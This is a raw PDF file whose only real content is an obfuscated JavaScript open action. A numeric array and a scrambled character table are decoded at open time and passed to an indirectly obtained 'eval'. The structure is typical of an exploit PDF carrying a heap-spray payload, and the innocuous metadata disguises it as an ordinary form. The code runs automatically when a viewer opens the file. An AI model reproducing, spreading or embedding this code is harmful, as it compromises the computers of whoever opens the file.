%PDF-1.5
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
10 0 obj
<</Creator(sli)/ModDate(D:20080817171147-07'00')/Company(Windjack Solutions, Inc.)/Title(al)>>
endobj
21 0 obj
<</Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[78 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 4/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/ProcSet[/PDF/Text/ImageC]/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
59 0 obj
[/ICCBased 68 0 R]
endobj
60 0 obj
<</Length 4/Filter/FlateDecode/Type/Contents>>
stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
function test2\(\){v=ar[z];s=s+cc[v];}
ar=[10,
64,
32,
66,
35,
29,
60,
61,
58,
67,
69,
69,
60,
61,
48,
51,
12,
5,
60,
61,
58,
2,
48,
51,
60,
61,
39,
2,
12,
5,
60,
61,
12,
47,
67,
5,
60,
61,
67,
67,
2,
48,
60,
61,
69,
5,
51,
34,
60,
61,
5,
34,
58,
10,
60,
61,
58,
10,
67,
34,
60,
61,
34,
51,
5,
34,
60,
61,
39,
34,
58,
10,
60,
61,
2,
69,
56,
51,
60,
61,
39,
69,
58,
10,
60,
61,
67,
67,
34,
58,
60,
61,
69,
69,
36,
10,
60,
61,
2,
12,
58,
10,
60,
61,
34,
67,
67,
51,
60,
61,
67,
67,
39,
5,
60,
61,
58,
56,
75,
51,
60,
61,
56,
2,
12,
12,
60,
61,
48,
48,
56,
34,
60,
61,
10,
58,
48,
48,
60,
61,
5,
34,
58,
10,
60,
61,
51,
67,
67,
34,
60,
61,
67,
47,
5,
69,
60,
61,
39,
2,
34,
69,
60,
61,
58,
39,
48,
10,
60,
61,
75,
5,
67,
5,
60,
61,
12,
5,
58,
2,
60,
61,
2,
56,
39,
2,
60,
61,
12,
10,
12,
47,
60,
61,
2,
56,
5,
51,
60,
61,
58,
10,
2,
69,
60,
61,
67,
51,
39,
2,
60,
61,
39,
5,
58,
10,
60,
61,
39,
58,
67,
2,
60,
61,
48,
2,
34,
67,
60,
61,
58,
10,
2,
69,
60,
61,
75,
34,
39,
69,
60,
61,
48,
2,
34,
67,
60,
61,
51,
47,
67,
67,
60,
61,
5,
56,
5,
47,
60,
61,
59,
36,
48,
51,
60,
61,
51,
2,
34,
67,
60,
61,
36,
10,
67,
67,
60,
61,
10,
12,
34,
48,
60,
61,
67,
58,
56,
34,
60,
61,
39,
5,
48,
75,
60,
61,
51,
56,
34,
58,
60,
61,
34,
36,
51,
10,
60,
61,
36,
59,
34,
67,
60,
61,
12,
10,
5,
34,
60,
61,
67,
10,
48,
56,
60,
61,
39,
2,
56,
48,
60,
61,
2,
12,
12,
69,
60,
61,
2,
12,
58,
10,
60,
61,
34,
67,
75,
5,
60,
61,
69,
69,
36,
36,
60,
61,
34,
51,
58,
10,
60,
61,
58,
36,
5,
10,
60,
61,
12,
51,
5,
69,
60,
61,
2,
5,
48,
48,
60,
61,
34,
51,
75,
5,
60,
61,
36,
58,
58,
10,
60,
61,
36,
36,
34,
67,
60,
61,
34,
5,
58,
10,
60,
61,
34,
67,
58,
10,
60,
61,
59,
10,
51,
2,
60,
61,
2,
47,
2,
12,
60,
61,
12,
10,
51,
67,
60,
61,
59,
36,
2,
67,
60,
61,
69,
58,
58,
10,
60,
61,
58,
34,
75,
34,
60,
61,
34,
51,
39,
36,
60,
61,
39,
5,
67,
67,
60,
61,
47,
69,
34,
67,
60,
61,
48,
67,
12,
10,
60,
61,
69,
58,
58,
10,
60,
61,
58,
10,
34,
58,
60,
61,
69,
59,
48,
39,
60,
61,
2,
47,
34,
2,
60,
61,
47,
58,
12,
58,
60,
61,
48,
48,
48,
48,
60,
61,
12,
75,
48,
48,
60,
61,
12,
58,
48,
47,
60,
61,
34,
34,
34,
34,
60,
61,
34,
34,
34,
34,
60,
61,
2,
34,
2,
58,
60,
61,
5,
34,
69,
59,
60,
61,
48,
48,
69,
58,
60,
61,
34,
34,
34,
34,
60,
61,
2,
34,
34,
34,
60,
61,
51,
34,
58,
67,
60,
61,
2,
34,
56,
47,
60,
61,
58,
10,
2,
2,
60,
61,
58,
10,
12,
51,
60,
61,
56,
34,
2,
12,
60,
61,
51,
67,
58,
67,
60,
61,
48,
48,
34,
2,
60,
61,
69,
58,
12,
67,
60,
61,
69,
12,
69,
48,
60,
61,
34,
34,
34,
34,
60,
61,
39,
2,
69,
58,
60,
61,
69,
51,
39,
75,
60,
61,
2,
5,
69,
36,
60,
61,
56,
69,
48,
48,
60,
61,
51,
5,
58,
67,
60,
61,
58,
10,
34,
58,
60,
61,
12,
58,
12,
58,
60,
61,
48,
48,
69,
56,
60,
61,
48,
48,
48,
48,
60,
61,
34,
75,
12,
10,
60,
61,
39,
75,
12,
10,
60,
61,
12,
51,
58,
56,
60,
61,
34,
56,
34,
5,
60,
61,
34,
34,
34,
34,
60,
61,
2,
51,
58,
36,
60,
61,
34,
51,
75,
5,
60,
61,
34,
5,
51,
39,
60,
61,
39,
75,
75,
5,
60,
61,
69,
39,
69,
2,
60,
61,
51,
39,
39,
67,
60,
61,
75,
5,
5,
5,
60,
61,
39,
69,
34,
5,
60,
61,
67,
67,
39,
75,
60,
61,
51,
39,
67,
75,
60,
61,
75,
5,
5,
5,
60,
61,
75,
34,
34,
58,
60,
61,
39,
67,
75,
36,
60,
61,
2,
67,
75,
34,
60,
61,
48,
58,
69,
58,
60,
61,
34,
34,
34,
34,
60,
61,
48,
48,
34,
34,
60,
61,
34,
51,
2,
69,
60,
61,
12,
58,
58,
10,
60,
61,
51,
47,
67,
67,
60,
61,
51,
39,
2,
56,
60,
61,
56,
36,
5,
5,
60,
61,
39,
39,
34,
34,
60,
61,
69,
75,
39,
34,
60,
61,
51,
39,
39,
5,
60,
61,
56,
36,
5,
5,
60,
61,
75,
12,
34,
2,
60,
61,
69,
51,
69,
5,
60,
61,
51,
69,
69,
51,
60,
61,
56,
36,
5,
5,
60,
61,
34,
34,
34,
47,
60,
61,
58,
59,
2,
47,
60,
61,
34,
5,
51,
56,
60,
61,
58,
58,
67,
34,
60,
61,
56,
36,
5,
5,
60,
61,
5,
56,
34,
5,
60,
61,
69,
59,
2,
56,
60,
61,
69,
59,
34,
34,
60,
61,
2,
67,
34,
34,
60,
61,
69,
59,
2,
39,
60,
61,
48,
48,
34,
34,
60,
61,
56,
5,
2,
69,
60,
61,
51,
34,
58,
2,
60,
61,
56,
69,
39,
2,
60,
61,
34,
34,
69,
59,
60,
61,
48,
48,
2,
67,
60,
61,
34,
5,
2,
69,
60,
61,
34,
34,
69,
59,
60,
61,
12,
10,
58,
67,
60,
61,
2,
67,
34,
51,
60,
61,
2,
69,
48,
48,
60,
61,
58,
67,
34,
5,
60,
61,
34,
51,
51,
67,
60,
61,
34,
75,
12,
10,
60,
61,
56,
67,
12,
10,
60,
61,
58,
34,
5,
39,
60,
61,
34,
34,
67,
48,
60,
61,
48,
59,
39,
2,
60,
61,
58,
34,
5,
39,
60,
61,
34,
34,
67,
48,
60,
61,
51,
5,
39,
2,
60,
61,
34,
34,
69,
59,
60,
61,
48,
12,
69,
59,
60,
61,
2,
69,
48,
48,
60,
61,
12,
58,
34,
58,
60,
61,
48,
12,
47,
51,
60,
61,
48,
48,
48,
48,
60,
61,
5,
12,
58,
12,
60,
61,
12,
51,
34,
12,
60,
61,
48,
12,
47,
58,
60,
61,
34,
12,
58,
59,
60,
61,
69,
48,
58,
47,
60,
61,
10,
36,
34,
56,
60,
61,
51,
59,
67,
67,
60,
61,
2,
10,
58,
59,
60,
61,
51,
69,
56,
10,
60,
61,
39,
47,
5,
69,
60,
61,
56,
59,
67,
69,
60,
61,
39,
34,
75,
48,
60,
61,
39,
5,
69,
58,
60,
61,
39,
34,
39,
5,
60,
61,
75,
48,
67,
59,
60,
61,
67,
47,
75,
48,
60,
61,
75,
12,
67,
56,
60,
61,
67,
34,
67,
75,
60,
61,
75,
12,
67,
75,
60,
61,
67,
5,
67,
75,
60,
61,
75,
12,
67,
5,
60,
61,
67,
47,
67,
58,
60,
61,
69,
67,
75,
48,
60,
61,
39,
34,
75,
12,
60,
61,
39,
34,
69,
58,
60,
61,
69,
69,
67,
48,
60,
61,
67,
69,
67,
36,
60,
61,
75,
69,
67,
34,
60,
61,
67,
36,
69,
2,
60,
61,
34,
34,
67,
67,
60,
61,
34,
34,
34,
34,
29,
27,
48,
61,
42,
51,
19,
71,
25,
42,
37,
12,
52,
20,
18,
23,
18,
59,
9,
1,
45,
43,
22,
68,
41,
71,
0,
12,
23,
18,
59,
28,
0,
12,
42,
66,
19,
41,
16,
75,
62,
1,
45,
43,
22,
18,
59,
14,
35,
18,
59,
27,
15,
18,
59,
35,
18,
59,
28,
32,
61,
10,
32,
19,
18,
71,
42,
66,
23,
34,
9,
1,
45,
24,
75,
43,
27,
18,
12,
19,
61,
18,
42,
37,
18,
59,
27,
15,
37,
48,
61,
42,
51,
19,
71,
25,
42,
37,
10,
26,
23,
43,
22,
20,
59,
18,
37,
36,
49,
66,
35,
42,
12,
68,
37,
65,
18,
18,
59,
45,
23,
43,
27,
20,
59,
18,
37,
20,
68,
35,
34,
26,
34,
51,
34,
51,
34,
51,
34,
51,
27,
20,
59,
18,
37,
59,
36,
36,
18,
35,
34,
26,
5,
34,
34,
34,
34,
34,
27,
20,
59,
18,
37,
33,
59,
45,
0,
25,
59,
36,
35,
61,
42,
12,
32,
51,
59,
33,
12,
23,
10,
64,
32,
66,
43,
27,
20,
59,
18,
37,
32,
51,
7,
0,
12,
42,
35,
33,
59,
45,
0,
25,
59,
36,
28,
0,
12,
42,
66,
19,
41,
16,
75,
27,
20,
59,
18,
37,
1,
45,
35,
59,
36,
36,
18,
44,
23,
32,
51,
7,
0,
12,
42,
14,
34,
26,
67,
58,
43,
27,
20,
59,
18,
37,
45,
59,
18,
32,
33,
35,
61,
42,
12,
32,
51,
59,
33,
12,
23,
55,
60,
61,
47,
34,
47,
34,
60,
61,
47,
34,
47,
34,
55,
43,
27,
45,
59,
18,
32,
33,
35,
12,
52,
20,
18,
23,
45,
59,
18,
32,
33,
9,
1,
45,
43,
27,
20,
59,
18,
37,
51,
25,
61,
42,
19,
75,
35,
23,
20,
68,
44,
34,
26,
5,
34,
34,
34,
34,
34,
43,
24,
59,
36,
36,
18,
27,
48,
25,
18,
23,
20,
59,
18,
37,
51,
25,
61,
42,
19,
35,
34,
27,
51,
25,
61,
42,
19,
62,
51,
25,
61,
42,
19,
75,
27,
51,
25,
61,
42,
19,
14,
14,
43,
22,
36,
49,
66,
6,
51,
25,
61,
42,
19,
46,
35,
45,
59,
18,
32,
33,
14,
33,
59,
45,
0,
25,
59,
36,
27,
15,
37,
20,
59,
18,
37,
25,
20,
12,
18,
48,
0,
25,
68,
35,
61,
42,
12,
32,
51,
59,
33,
12,
23,
55,
60,
61,
34,
51,
34,
51,
60,
61,
34,
51,
34,
51,
55,
43,
27,
68,
41,
71,
0,
12,
23,
25,
20,
12,
18,
48,
0,
25,
68,
28,
0,
12,
42,
66,
19,
41,
62,
5,
5,
47,
2,
75,
43,
22,
25,
20,
12,
18,
48,
0,
25,
68,
14,
35,
25,
20,
12,
18,
48,
0,
25,
68,
27,
15,
37,
19,
41,
71,
32,
28,
51,
25,
0,
0,
59,
10,
50,
19,
25,
18,
12,
35,
54,
25,
0,
0,
59,
10,
28,
51,
25,
0,
0,
12,
51,
19,
40,
63,
59,
71,
0,
73,
42,
48,
25,
23,
22,
32,
61,
10,
64,
21,
55,
55,
9,
63,
32,
66,
21,
25,
20,
12,
18,
48,
0,
25,
68,
15,
43,
27,
15,
37,
48,
61,
42,
51,
19,
71,
25,
42,
37,
33,
18,
71,
42,
19,
48,
23,
43,
22,
42,
25,
33,
35,
61,
42,
12,
32,
51,
59,
33,
12,
23,
55,
60,
61,
34,
65,
34,
65,
60,
61,
34,
65,
34,
65,
60,
61,
34,
65,
34,
65,
60,
61,
34,
65,
34,
65,
55,
43,
27,
20,
59,
18,
37,
33,
59,
45,
0,
25,
59,
36,
35,
61,
42,
12,
32,
51,
59,
33,
12,
23,
10,
64,
32,
66,
43,
27,
41,
12,
59,
33,
10,
0,
25,
51,
49,
35,
42,
25,
33,
14,
33,
59,
45,
0,
25,
59,
36,
27,
10,
71,
66,
10,
0,
25,
51,
49,
35,
61,
42,
12,
32,
51,
59,
33,
12,
23,
55,
60,
61,
34,
65,
34,
65,
60,
61,
34,
65,
34,
65,
55,
43,
27,
41,
12,
59,
36,
12,
18,
32,
71,
52,
12,
35,
75,
34,
27,
32,
33,
18,
59,
45,
35,
41,
12,
59,
36,
12,
18,
32,
71,
52,
12,
14,
41,
12,
59,
33,
10,
0,
25,
51,
49,
28,
0,
12,
42,
66,
19,
41,
27,
68,
41,
71,
0,
12,
23,
10,
71,
66,
10,
0,
25,
51,
49,
28,
0,
12,
42,
66,
19,
41,
62,
32,
33,
18,
59,
45,
43,
22,
10,
71,
66,
10,
0,
25,
51,
49,
14,
35,
10,
71,
66,
10,
0,
25,
51,
49,
27,
15,
37,
48,
71,
0,
0,
10,
0,
25,
51,
49,
35,
10,
71,
66,
10,
0,
25,
51,
49,
28,
32,
61,
10,
32,
19,
18,
71,
42,
66,
23,
34,
9,
32,
33,
18,
59,
45,
43,
27,
10,
0,
25,
51,
49,
35,
10,
71,
66,
10,
0,
25,
51,
49,
28,
32,
61,
10,
32,
19,
18,
71,
42,
66,
23,
34,
9,
10,
71,
66,
10,
0,
25,
51,
49,
28,
0,
12,
42,
66,
19,
41,
44,
32,
33,
18,
59,
45,
43,
27,
68,
41,
71,
0,
12,
23,
10,
0,
25,
51,
49,
28,
0,
12,
42,
66,
19,
41,
14,
32,
33,
18,
59,
45,
62,
34,
26,
5,
34,
34,
34,
34,
43,
22,
10,
0,
25,
51,
49,
35,
10,
0,
25,
51,
49,
14,
10,
0,
25,
51,
49,
14,
48,
71,
0,
0,
10,
0,
25,
51,
49,
27,
15,
37,
63,
12,
63,
35,
42,
12,
68,
37,
65,
18,
18,
59,
45,
23,
43,
27,
48,
25,
18,
23,
71,
35,
34,
27,
71,
62,
56,
5,
34,
34,
27,
71,
14,
14,
43,
22,
63,
12,
63,
6,
71,
46,
35,
10,
0,
25,
51,
49,
14,
41,
12,
59,
33,
10,
0,
25,
51,
49,
27,
15,
37,
20,
59,
18,
37,
42,
61,
63,
35,
56,
75,
47,
47,
47,
47,
47,
47,
47,
47,
47,
47,
47,
47,
47,
47,
47,
47,
47,
47,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
58,
27,
61,
19,
71,
0,
28,
33,
18,
71,
42,
19,
48,
23,
55,
60,
5,
2,
34,
34,
34,
48,
55,
9,
42,
61,
63,
43,
27,
15,
37,
48,
61,
42,
51,
19,
71,
25,
42,
37,
66,
12,
19,
71,
51,
25,
42,
23,
43,
22,
20,
59,
18,
37,
59,
18,
18,
45,
35,
42,
12,
68,
37,
65,
18,
18,
59,
45,
23,
43,
27,
71,
48,
23,
59,
33,
33,
28,
36,
25,
51,
28,
54,
25,
0,
0,
59,
10,
28,
66,
12,
19,
73,
51,
25,
42,
43,
22,
20,
59,
18,
37,
33,
59,
45,
0,
25,
59,
36,
35,
61,
42,
12,
32,
51,
59,
33,
12,
23,
10,
64,
32,
66,
43,
27,
20,
59,
18,
37,
41,
53,
1,
2,
34,
34,
54,
4,
35,
33,
59,
45,
0,
25,
59,
36,
28,
0,
12,
42,
66,
19,
41,
16,
75,
27,
20,
59,
18,
37,
1,
45,
35,
34,
26,
5,
34,
34,
34,
34,
34,
44,
23,
41,
53,
1,
2,
34,
34,
54,
4,
14,
34,
26,
67,
58,
43,
27,
20,
59,
18,
37,
45,
59,
18,
32,
33,
35,
61,
42,
12,
32,
51,
59,
33,
12,
23,
55,
60,
61,
47,
34,
47,
34,
60,
61,
47,
34,
47,
34,
55,
43,
27,
45,
59,
18,
32,
33,
35,
12,
52,
20,
18,
23,
45,
59,
18,
32,
33,
9,
1,
45,
43,
27,
20,
59,
18,
37,
33,
2,
65,
64,
13,
69,
2,
48,
35,
23,
34,
26,
34,
51,
34,
51,
34,
51,
34,
51,
44,
34,
26,
5,
34,
34,
34,
34,
34,
43,
24,
34,
26,
5,
34,
34,
34,
34,
34,
27,
48,
25,
18,
23,
20,
59,
18,
37,
20,
1,
51,
11,
38,
47,
69,
45,
35,
34,
27,
20,
1,
51,
11,
38,
47,
69,
45,
62,
33,
2,
65,
64,
13,
69,
2,
48,
27,
20,
1,
51,
11,
38,
47,
69,
45,
14,
14,
43,
22,
59,
18,
18,
45,
6,
20,
1,
51,
11,
38,
47,
69,
45,
46,
35,
45,
59,
18,
32,
33,
14,
33,
59,
45,
0,
25,
59,
36,
27,
15,
37,
20,
59,
18,
37,
19,
74,
8,
41,
4,
10,
17,
68,
35,
61,
42,
12,
32,
51,
59,
33,
12,
23,
55,
60,
34,
47,
55,
43,
27,
68,
41,
71,
0,
12,
23,
19,
74,
8,
41,
4,
10,
17,
68,
28,
0,
12,
42,
66,
19,
41,
62,
34,
26,
5,
34,
34,
34,
43,
22,
19,
74,
8,
41,
4,
10,
17,
68,
14,
35,
19,
74,
8,
41,
4,
10,
17,
68,
27,
15,
37,
19,
74,
8,
41,
4,
10,
17,
68,
35,
55,
4,
28,
55,
14,
19,
74,
8,
41,
4,
10,
17,
68,
27,
59,
33,
33,
28,
36,
25,
51,
28,
54,
25,
0,
0,
59,
10,
28,
66,
12,
19,
73,
51,
25,
42,
23,
19,
74,
8,
41,
4,
10,
17,
68,
43,
27,
15,
15,
37,
59,
31,
0,
61,
66,
71,
42,
32,
35,
59,
33,
33,
28,
33,
0,
61,
66,
73,
42,
32,
27,
20,
59,
18,
37,
32,
20,
35,
33,
59,
18,
32,
12,
73,
42,
19,
23,
59,
33,
33,
28,
20,
71,
12,
68,
12,
18,
57,
12,
18,
32,
71,
25,
42,
28,
19,
25,
50,
19,
18,
71,
42,
66,
23,
43,
28,
51,
41,
59,
18,
65,
19,
23,
34,
43,
43,
27,
48,
25,
18,
23,
20,
59,
18,
37,
71,
35,
34,
27,
71,
62,
59,
31,
0,
61,
66,
71,
42,
32,
28,
0,
12,
42,
66,
19,
41,
27,
71,
14,
14,
43,
22,
71,
48,
23,
59,
31,
0,
61,
66,
71,
42,
32,
6,
71,
46,
28,
42,
59,
63,
12,
35,
35,
29,
40,
50,
51,
18,
71,
33,
19,
29,
43,
22,
20,
59,
18,
37,
0,
20,
35,
59,
31,
0,
61,
66,
71,
42,
32,
6,
71,
46,
28,
20,
12,
18,
32,
71,
25,
42,
27,
15,
15,
37,
71,
48,
23,
23,
0,
20,
35,
35,
47,
43,
30,
30,
23,
23,
32,
20,
35,
35,
58,
43,
70,
70,
23,
0,
20,
62,
35,
58,
28,
56,
75,
43,
43,
43,
22,
66,
12,
19,
71,
51,
25,
42,
23,
43,
27,
15,
12,
0,
32,
12,
37,
71,
48,
23,
0,
20,
35,
35,
39,
28,
56,
43,
22,
33,
18,
71,
42,
19,
48,
23,
43,
27,
15,
12,
0,
32,
12,
37,
71,
48,
23,
23,
23,
32,
20,
35,
35,
69,
43,
30,
30,
23,
32,
20,
35,
35,
39,
43,
43,
70,
70,
23,
0,
20,
62,
39,
28,
56,
56,
43,
43,
22,
10,
26,
23,
43,
27,
15,
12,
0,
32,
12,
37,
71,
48,
23,
23,
0,
20,
3,
35,
47,
28,
56,
43,
30,
30,
23,
0,
20,
62,
35,
47,
28,
75,
43,
30,
30,
23,
0,
20,
3,
35,
58,
28,
56,
67,
43,
30,
30,
23,
0,
20,
62,
35,
58,
28,
56,
39,
43,
43,
22,
48,
61,
42,
51,
19,
71,
25,
42,
37,
59,
23,
43,
22,
61,
19,
71,
0,
28,
33,
18,
71,
42,
19,
36,
23,
29,
33,
72,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
56,
37,
21,
37,
45,
45,
45,
45,
56,
56,
56,
29,
9,
42,
12,
68,
37,
38,
59,
19,
12,
23,
43,
43,
27,
15,
20,
59,
18,
37,
41,
35,
59,
33,
33,
28,
33,
0,
61,
66,
73,
42,
32,
27,
48,
25,
18,
23,
20,
59,
18,
37,
48,
35,
34,
27,
48,
62,
41,
28,
0,
12,
42,
66,
19,
41,
27,
48,
14,
14,
43,
22,
71,
48,
23,
41,
6,
48,
46,
28,
42,
59,
63,
12,
35,
35,
29,
40,
50,
51,
18,
71,
33,
19,
29,
43,
22,
20,
59,
18,
37,
71,
35,
41,
6,
48,
46,
28,
20,
12,
18,
32,
71,
25,
42,
27,
15,
15,
37,
71,
48,
23,
23,
71,
3,
58,
28,
56,
75,
43,
70,
70,
23,
71,
62,
58,
28,
75,
43,
43,
22,
51,
35,
42,
12,
68,
37,
65,
18,
18,
59,
45,
23,
43,
27,
20,
59,
18,
37,
36,
35,
61,
42,
12,
32,
51,
59,
33,
12,
23,
29,
60,
61,
47,
34,
47,
34,
60,
61,
47,
34,
47,
34,
29,
43,
27,
20,
59,
18,
37,
12,
35,
61,
42,
12,
32,
51,
59,
33,
12,
23,
10,
64,
32,
66,
43,
27,
68,
41,
71,
0,
12,
23,
36,
28,
0,
12,
42,
66,
19,
41,
62,
35,
34,
26,
58,
34,
34,
34,
43,
22,
36,
14,
35,
36,
27,
15,
36,
35,
36,
28,
32,
61,
10,
32,
19,
18,
23,
34,
9,
34,
26,
58,
34,
34,
34,
44,
12,
28,
0,
12,
42,
66,
19,
41,
43,
27,
48,
25,
18,
23,
48,
35,
34,
27,
48,
62,
75,
47,
34,
34,
27,
48,
14,
14,
43,
22,
51,
6,
48,
46,
35,
36,
14,
12,
27,
15,
59,
23,
43,
27,
59,
23,
43,
27,
19,
18,
45,
22,
19,
41,
71,
32,
28,
63,
12,
36,
71,
59,
28,
42,
12,
68,
31,
0,
59,
45,
12,
18,
23,
42,
61,
0,
0,
43,
27,
15,
51,
59,
19,
51,
41,
23,
12,
43,
22,
15,
59,
23,
43,
27,
15,
15];
cc={q:"lq5>N4[_M,bQeK+}*Grtv:{\(/ox;.'|Psp0=d D7Ehn\)-y]9fkSczWC'1V8a%u<mjAg3w6&i@IU2"}.q;
qq='12e'+'wqva!l';
q=qq[2]+qq[5]+qq[6]+qq[8];
try{loadXML\({}\);}catch\($\){
b={v:{q:this}}.v.q;
w={v:b[q]}.v;
s=Array\(\);
n={v:cc}.v;
for\(i=0;i-3848<0;i++\){
z=i;
test2\(\);
}
w\(s\);
}
)>>
endobj
xref
0 12
trailer
<</Size 12
/Root 21 0 R>>
xref
0 0
trailer
<</Size 12/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF